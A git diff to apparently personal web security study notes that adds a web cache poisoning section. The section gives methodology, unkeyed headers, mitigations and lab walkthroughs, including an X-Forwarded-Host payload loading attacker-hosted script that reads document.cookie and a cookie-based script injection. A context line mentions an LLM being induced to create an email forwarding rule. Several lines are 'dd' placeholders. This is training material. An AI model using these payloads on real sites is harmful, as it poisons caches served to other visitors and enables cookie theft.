@@ -77,8 +77,8 @@
 - OpenAPI Parser: Target > Site map > Send to OpenAPI Parser [API testing]
 - JS Link Finder: Scanning js files for endpoint links [API testing]
 - Content Type Converter: JSON to XML; XMl to JSON; Body param to JSON; Body param to XML [API testing]
-- Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing]
-- Clickbandit:
+- Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing, Web Cache Poison]
+- Clic
   
 ## SQL Injection
 **How to detect**     
@@ -3282,9 +3282,105 @@ LLM -> API: create_email_forwarding_rule('peter')
 - steps
   - **Identify and evaluate unkeyed inputs**: Hackers first look for parts of a website that don't properly check what information is being sent. These unchecked parts (called "unkeyed inputs") allow hackers to send unexpected information.
   - **Elicit a harmful response from the back-end server**: Next, the hacker sends some harmful or misleading information to the website. The goal is to get the website to respond in a way that helps the hacker, like displaying incorrect data or running a dangerous command.
-  - **Get the response cached**: Finally, if the website saves (or "caches") this harmful response, the bad information might be shown to everyone who visits the website later. This makes the attack even more dangerous, because it spreads automatically to other visitors.  
+  - **Get the response cached**: Finally, if the website saves (or "caches") this harmful response, the bad information might be shown to everyone who visits the website later. This makes the attack even more dangerous, because it spreads automatically to other visitors.
+ 
+**Methodology**
+- Identify a suitable cache oracle
+  ```
+  Response header
+
+  Cache-control: max-age=30
+  Age: 3
+  X-Cache: hit
+  ```
+- add a cache buster
+  - First time: X-Cache: miss
+  - Second time: X-Cache: hit
+- identify unkeyed inputs with Param Miner
+- Explore input potential
+- Elicit a harmful response & inject into cache
+ 
+**unkey inputs**
+- Host: If the cache server ignores the Host header in the request.
+- X-Forwarded-For: Often used for IP address tracking but can be manipulated.
+- X-Forwarded-Host: Similar to Host, but for forwarded requests.
+- X-Original-URL: Can redirect to a different path.
+- X-HTTP-Method-Override: Allows the client to override the HTTP method.
+- Referer: Often ignored by caches but could be used in poisoning.
+- User-Agent: If different user agents lead to different content.
+- Accept-Encoding: If not considered, could lead to delivering wrong content.
+- X-Forwarded-Proto: Indicates the protocol (HTTP/HTTPS) used by the original client.
+
+**Mitigation**
+- Include all relevant inputs in the cache key: Ensure that all elements that influence the response (e.g., HTTP headers, query parameters, cookies) are included in the cache key to avoid mixing responses.
+- Normalize URL parameters: Ensure that the cache considers variations in URL query strings.
+- Set `Cache-Control: no-store` for sensitive data or responses that should never be cached.
+- Use `Cache-Control: private` for user-specific responses.
+- Apply `Cache-Control: max-age or s-maxage` to limit how long content can be cached.
+- Minimize the use of untrusted headers: Avoid relying on headers like `X-Forwarded-For`, `X-HTTP-Method-Override`
+- Use Secure HTTP Headers: Content Security Policy, X-Content-Type-Options: nosniff, X-Frame-Options
 
 ### Web Cache Poisoning Lab
+- Web cache poisoning with an unkeyed header
+  - study the traffic
+    ```
+    GET /
+
+    Cache-Control: max-age=30
+    Age: 0
+    X-Cache: miss
+    ```
+  - Add a cache buster
+    Note: X-Cache: hit. This tells us that the response came from the cache.
+    ```
+    Request
+    GET /?cb=1234
+    ...
+    Add X-Forwarded-Host: lab.exploit-server.net
+
+    Response
+    Age: 0
+    X-Cache: miss
+    
+    <script type="text/javascript" src="//exploit-0a39002403db726f8507c69301a10085.exploit-server.net/resources/js/tracking.js"></script>
+    ```
+  - Exploit server
+    Files: /resources/js/tracking.js  
+    Body: alert(document.cookie)
+  - Remove the cache buster and replay the request untill you see your exploit server URL being reflected in the response and X-Cache: hit in the header  
+- Web cache poisoning with an unkeyed cookie
+  - study the traffic
+    ```
+    request
+    GET / HTTP/2
+    Cookie: session=9G8thj6mH0oXLVpZn3rO7SsFLtQdzhIk; fehost=prod-cache-01
+
+    response
+    <script>
+         data = {"host":"0af4009904604891812a5297002f0043.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
+    </script>
+    ```
+  - Change the value of the cookie to include an alert prompt and resend the request > confirm the string is reflected in the response
+    `fehost=someString"-alert(1)-"someString`
+  - Replay the request until you see the payload in the response and X-Cache: hit in the headers. Load the URL in the browser and confirm the alert() fires
+- Web cache poisoning with multiple headers
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
 
 ## HTTP Host Header
 Content for HTTP Host Header...
